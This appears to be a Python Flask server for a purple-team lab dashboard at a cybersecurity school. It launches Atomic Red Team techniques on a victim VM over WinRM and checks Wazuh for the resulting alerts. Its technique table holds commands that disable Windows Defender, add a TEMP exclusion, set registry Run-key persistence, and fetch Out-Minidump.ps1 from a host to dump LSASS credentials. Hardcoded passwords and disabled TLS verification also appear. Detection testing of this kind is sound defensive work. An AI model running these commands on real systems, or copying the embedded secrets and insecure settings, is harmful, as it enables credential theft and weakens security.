#!/usr/bin/env python3
"""
server.py — Purple Team Dashboard Proxy Server
Holberton Cybersecurity — Adversary Emulation Lab
"""

import json, ssl, base64, urllib.request, threading, atexit, os, signal, sys
from datetime import datetime, timezone
from flask import Flask, jsonify, request, send_from_directory
import winrm

app = Flask(__name__, static_folder='.')

# ── Config ────────────────────────────────────────────────────────────────────

INDEXER_URL   = "https://127.0.0.1:9200"
INDEXER_USER  = "admin"
INDEXER_PASS  = "ly3ar+g1BB.+L2wygfa6xgQLvIHcoaHN"
INDEX_PATTERN = "wazuh-alerts-4.x-*"
VICTIM_IP     = "192.168.56.101"
VICTIM_USER   = "walid"
VICTIM_PASS   = "123"
VICTIM_WINRM  = f"http://{VICTIM_IP}:5985/wsman"

LOGS_DIR      = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'logs')
LIVE_LOG_FILE = os.path.join(LOGS_DIR, 'live-alerts.json')

# CRITICAL: only these rule IDs ever touch the dashboard — no noise
WATCHED_RULES = {"100002", "100003", "100004", "100005", "100006"}

# ── Techniques ────────────────────────────────────────────────────────────────

TECHNIQUES = {
    "T1059.001": {
        "name":             "PowerShell Encoded Command",
        "tactic":           "Execution",
        "rule_ids":         ["100002"],
        "confidence":       5,
        "noise":            1,
        "description":      "Executes base64-encoded PowerShell via cmd.exe -e flag to obfuscate payload",
        "command_preview":  'cmd.exe /c powershell.exe -e <base64_blob>',
        "command": (
            "Set-MpPreference -DisableRealtimeMonitoring $true; "
            "Import-Module invoke-atomicredteam -Force; "
            "Import-Module powershell-yaml -Force; "
            "Invoke-AtomicTest T1059.001 -TestNumbers 17 -TimeoutSeconds 30"
        )
    },
    "T1547.001": {
        "name":             "Registry Run Key Persistence",
        "tactic":           "Persistence",
        "rule_ids":         ["100003"],
        "confidence":       5,
        "noise":            2,
        "description":      "Writes executable to HKCU\\CurrentVersion\\Run for logon persistence",
        "command_preview":  'reg.exe ADD HKCU\\...\\Run /v AtomicRedTeam /t REG_SZ /d C:\\Path\\evil.exe',
        "command": (
            "Set-MpPreference -DisableRealtimeMonitoring $true; "
            "Import-Module invoke-atomicredteam -Force; "
            "Import-Module powershell-yaml -Force; "
            "Invoke-AtomicTest T1547.001 -TestNumbers 1 -TimeoutSeconds 30; "
            "Start-Sleep 2; "
            "Invoke-AtomicTest T1547.001 -TestNumbers 1 -Cleanup"
        )
    },
    "T1087.001": {
        "name":             "Local Account Discovery",
        "tactic":           "Discovery",
        "rule_ids":         ["100004"],
        "confidence":       5,
        "noise":            3,
        "description":      "Enumerates local users and groups via net.exe user/localgroup subcommands",
        "command_preview":  'net user & net localgroup "Users" & net localgroup',
        "command": (
            "Set-MpPreference -DisableRealtimeMonitoring $true; "
            "Import-Module invoke-atomicredteam -Force; "
            "Import-Module powershell-yaml -Force; "
            "Invoke-AtomicTest T1087.001 -TestNumbers 8 -TimeoutSeconds 30"
        )
    },
    "T1003.001": {
        "name":             "LSASS Memory Credential Dump",
        "tactic":           "Credential Access",
        "rule_ids":         ["100005", "100006"],
        "confidence":       5,
        "noise":            2,
        "description":      "Dumps lsass.exe memory to disk via Out-Minidump.ps1 to extract credentials",
        "command_preview":  'Get-Process lsass | Out-Minidump -DumpFilePath $env:TEMP',
        "command": (
            "Set-MpPreference -DisableRealtimeMonitoring $true; "
            "Add-MpPreference -ExclusionPath $env:TEMP; "
            "Remove-Item \"$env:TEMP\\lsass_*.dmp\" -Force -ErrorAction Ignore; "
            "Remove-Item \"$env:TEMP\\Out-Minidump.ps1\" -Force -ErrorAction Ignore; "
            "IWR 'http://192.168.56.1:8080/Out-Minidump.ps1' "
            "-OutFile \"$env:TEMP\\Out-Minidump.ps1\" -UseBasicParsing; "
            ". \"$env:TEMP\\Out-Minidump.ps1\"; "
            "Get-Process lsass | Out-Minidump -DumpFilePath $env:TEMP"
        )
    }
}

# rule_id -> technique_id reverse map
RULE_TO_TECHNIQUE = {}
for tid, t in TECHNIQUES.items():
    for rid in t["rule_ids"]:
        RULE_TO_TECHNIQUE[rid] = tid

# ── Live log ──────────────────────────────────────────────────────────────────

def init_live_log():
    os.makedirs(LOGS_DIR, exist_ok=True)
    with open(LIVE_LOG_FILE, 'w') as f:
        json.dump([], f)
    print(f"  Live log   : {LIVE_LOG_FILE}")

def cleanup_live_log():
    try:
        if os.path.exists(LIVE_LOG_FILE):
            os.remove(LIVE_LOG_FILE)
            print(f"\n  Live log cleared on exit.")
    except Exception:
        pass

_live_log_lock = threading.Lock()
_seen_alert_ids = set()  # prevent duplicate log entries

def try_append_live_log(alert_id: str, entry: dict):
    """Append to live log only if this alert_id hasn't been seen yet."""
    with _live_log_lock:
        if alert_id in _seen_alert_ids:
            return False
        _seen_alert_ids.add(alert_id)
        try:
            with open(LIVE_LOG_FILE, 'r') as f:
                entries = json.load(f)
            entries.insert(0, entry)
            entries = entries[:500]
            with open(LIVE_LOG_FILE, 'w') as f:
                json.dump(entries, f, indent=2)
            return True
        except Exception as e:
            app.logger.warning(f"Live log write failed: {e}")
            return False

# ── Indexer ───────────────────────────────────────────────────────────────────

def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    return ctx

def _auth():
    return "Basic " + base64.b64encode(
        f"{INDEXER_USER}:{INDEXER_PASS}".encode()).decode()

def query_rule(rule_id: str, window_minutes: int) -> list:
    """Query a single rule ID. Only called for WATCHED_RULES."""
    assert rule_id in WATCHED_RULES, f"Refusing to query non-watched rule {rule_id}"
    body = {
        "size": 20,
        "query": {
            "bool": {
                "must": [
                    {"match": {"rule.id": rule_id}},
                    {"range": {"timestamp": {"gte": f"now-{window_minutes}m"}}}
                ]
            }
        },
        "sort": [{"timestamp": {"order": "desc"}}],
        "_source": [
            "timestamp", "rule.id", "rule.description", "rule.level",
            "rule.mitre", "agent.name", "agent.ip",
            "data.win.system.eventID",
            "data.win.eventdata.commandLine",
            "data.win.eventdata.image",
            "data.win.eventdata.parentImage",
            "data.win.eventdata.targetObject",
            "data.win.eventdata.targetFilename",
            "data.win.eventdata.sourceImage",
            "data.win.eventdata.targetImage",
            "data.win.eventdata.grantedAccess",
            "data.win.eventdata.user"
        ]
    }
    url  = f"{INDEXER_URL}/{INDEX_PATTERN}/_search"
    data = json.dumps(body).encode()
    req  = urllib.request.Request(
        url, data=data,
        headers={"Authorization": _auth(), "Content-Type": "application/json"}
    )
    try:
        resp = urllib.request.urlopen(req, context=_ssl_ctx(), timeout=8)
        return json.loads(resp.read()).get("hits", {}).get("hits", [])
    except Exception as e:
        app.logger.warning(f"Indexer error rule {rule_id}: {e}")
        return []

def extract_key_field(src: dict) -> tuple:
    """Extract the most meaningful field from an alert for display."""
    ed = src.get("data", {}).get("win", {}).get("eventdata", {})
    eid = src.get("data", {}).get("win", {}).get("system", {}).get("eventID", "")

    if eid == "1":
        val = ed.get("commandLine", "")
        return ("commandLine", val[:120] + "..." if len(val) > 120 else val)
    elif eid == "13":
        val = ed.get("targetObject", "")
        return ("targetObject", val[-80:] if len(val) > 80 else val)
    elif eid == "10":
        src_img = ed.get("sourceImage", "").split("\\")[-1]
        tgt_img = ed.get("targetImage", "").split("\\")[-1]
        access  = ed.get("grantedAccess", "")
        return ("processAccess", f"{src_img} → {tgt_img} [{access}]")
    elif eid == "11":
        val = ed.get("targetFilename", "")
        return ("targetFilename", val.split("\\")[-1] if val else "")
    else:
        val = ed.get("commandLine", ed.get("targetObject", ""))
        return ("field", val[:100] if val else "")

def danger_level(wazuh_level: int) -> str:
    if wazuh_level >= 15: return "CRITICAL"
    if wazuh_level >= 12: return "HIGH"
    if wazuh_level >= 8:  return "MEDIUM"
    if wazuh_level >= 4:  return "LOW"
    return "INFO"

# ── Attack output store ───────────────────────────────────────────────────────

attack_outputs = {}

# ── WinRM ─────────────────────────────────────────────────────────────────────

def run_on_victim(cmd: str) -> dict:
    try:
        s = winrm.Session(
            VICTIM_WINRM, auth=(VICTIM_USER, VICTIM_PASS),
            transport='ntlm', read_timeout_sec=120, operation_timeout_sec=110
        )
        r = s.run_ps(cmd)
        return {
            "success":   r.status_code == 0,
            "stdout":    r.std_out.decode('utf-8', errors='replace').strip(),
            "stderr":    r.std_err.decode('utf-8', errors='replace').strip(),
            "exit_code": r.status_code
        }
    except Exception as e:
        return {"success": False, "stdout": "", "stderr": str(e), "exit_code": -1}

# ── API ───────────────────────────────────────────────────────────────────────

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/status')
def api_status():
    indexer_ok = winrm_ok = False
    try:
        req = urllib.request.Request(INDEXER_URL, headers={"Authorization": _auth()})
        urllib.request.urlopen(req, context=_ssl_ctx(), timeout=5)
        indexer_ok = True
    except Exception:
        pass
    try:
        r = run_on_victim("echo ok")
        winrm_ok = r["success"] and "ok" in r["stdout"]
    except Exception:
        pass
    return jsonify({"indexer": indexer_ok, "winrm": winrm_ok,
                    "time": datetime.now(timezone.utc).isoformat()})

@app.route('/api/techniques')
def api_techniques():
    return jsonify({
        tid: {k: v for k, v in t.items() if k != "command"}
        for tid, t in TECHNIQUES.items()
    })

@app.route('/api/alerts')
def api_alerts():
    window     = int(request.args.get('window', 10))
    out        = {}
    new_alerts = []   # alerts to notify browser about

    for tid, tech in TECHNIQUES.items():
        all_hits  = []
        for rid in tech["rule_ids"]:
            all_hits.extend(query_rule(rid, window))

        # sort by timestamp desc
        all_hits.sort(
            key=lambda h: h.get("_source", {}).get("timestamp", ""),
            reverse=True
        )

        detected   = len(all_hits) > 0
        latest_ts  = rule_fired = None
        key_field  = ("", "")
        wazuh_lvl  = 0

        if all_hits:
            src        = all_hits[0].get("_source", {})
            latest_ts  = src.get("timestamp")
            rule_fired = src.get("rule", {}).get("id")
            wazuh_lvl  = int(src.get("rule", {}).get("level", 0) or 0)
            key_field  = extract_key_field(src)

            # Write each NEW alert to live log
            for hit in all_hits:
                alert_id  = hit.get("_id", "")
                hit_src   = hit.get("_source", {})
                hit_rule  = hit_src.get("rule", {})
                hit_ed    = hit_src.get("data", {}).get("win", {}).get("eventdata", {})
                hit_sys   = hit_src.get("data", {}).get("win", {}).get("system", {})
                hit_level = int(hit_rule.get("level", 0) or 0)
                hit_kf    = extract_key_field(hit_src)

                entry = {
                    "alert_id":       alert_id,
                    "logged_at":      datetime.now(timezone.utc).isoformat(),
                    "technique_id":   tid,
                    "technique_name": tech["name"],
                    "tactic":         tech["tactic"],
                    "timestamp":      hit_src.get("timestamp", ""),
                    "rule_id":        hit_rule.get("id", ""),
                    "rule_level":     hit_level,
                    "rule_desc":      hit_rule.get("description", ""),
                    "danger":         danger_level(hit_level),
                    "agent":          hit_src.get("agent", {}).get("name", ""),
                    "event_id":       hit_sys.get("eventID", ""),
                    "key_field_name": hit_kf[0],
                    "key_field_value":hit_kf[1],
                    "user":           hit_ed.get("user", ""),
                    "mitre":          hit_rule.get("mitre", {})
                }

                if try_append_live_log(alert_id, entry):
                    new_alerts.append({
                        "technique_id":   tid,
                        "technique_name": tech["name"],
                        "rule_id":        hit_rule.get("id", ""),
                        "rule_level":     hit_level,
                        "danger":         danger_level(hit_level),
                        "timestamp":      hit_src.get("timestamp", ""),
                        "key_field_name": hit_kf[0],
                        "key_field_value":hit_kf[1]
                    })

        out[tid] = {
            "technique_id":    tid,
            "technique_name":  tech["name"],
            "tactic":          tech["tactic"],
            "detected":        detected,
            "alert_count":     len(all_hits),
            "rule_fired":      rule_fired,
            "latest_alert":    latest_ts,
            "wazuh_level":     wazuh_lvl,
            "danger":          danger_level(wazuh_lvl) if detected else "",
            "confidence":      tech["confidence"],
            "noise":           tech["noise"],
            "window_minutes":  window,
            "key_field_name":  key_field[0],
            "key_field_value": key_field[1]
        }

    return jsonify({"detections": out, "new_alerts": new_alerts})

@app.route('/api/run/<technique_id>', methods=['POST'])
def api_run(technique_id):
    if technique_id not in TECHNIQUES:
        return jsonify({"error": f"Unknown technique: {technique_id}"}), 404
    tech = TECHNIQUES[technique_id]
    attack_outputs[technique_id] = {
        "status": "running", "stdout": "", "stderr": "",
        "start_time": datetime.now(timezone.utc).isoformat()
    }
    def execute():
        result = run_on_victim(tech["command"])
        attack_outputs[technique_id].update({
            "status":   "done" if result["success"] else "error",
            "stdout":   result["stdout"],
            "stderr":   result["stderr"],
            "exit_code":result["exit_code"],
            "end_time": datetime.now(timezone.utc).isoformat()
        })
    threading.Thread(target=execute, daemon=True).start()
    return jsonify({"status": "triggered", "technique_id": technique_id,
                    "poll_after": 15})

@app.route('/api/attack-output/<technique_id>')
def api_attack_output(technique_id):
    return jsonify(attack_outputs.get(technique_id, {"status": "idle"}))

@app.route('/api/live-logs')
def api_live_logs():
    try:
        with open(LIVE_LOG_FILE, 'r') as f:
            return jsonify(json.load(f))
    except Exception:
        return jsonify([])

# ── Boot ──────────────────────────────────────────────────────────────────────

def handle_shutdown(sig, frame):
    cleanup_live_log()
    sys.exit(0)

if __name__ == '__main__':
    init_live_log()
    atexit.register(cleanup_live_log)
    signal.signal(signal.SIGINT,  handle_shutdown)
    signal.signal(signal.SIGTERM, handle_shutdown)
    print()
    print("  Purple Team Dashboard — Holberton Cybersecurity")
    print("  ─────────────────────────────────────────────────")
    print("  Dashboard  : http://localhost:5000")
    print(f"  Indexer    : {INDEXER_URL}")
    print(f"  Victim     : {VICTIM_IP} (WinRM)")
    print(f"  Watched rules: {', '.join(sorted(WATCHED_RULES))}")
    print()
    app.run(host='0.0.0.0', port=5000, debug=False)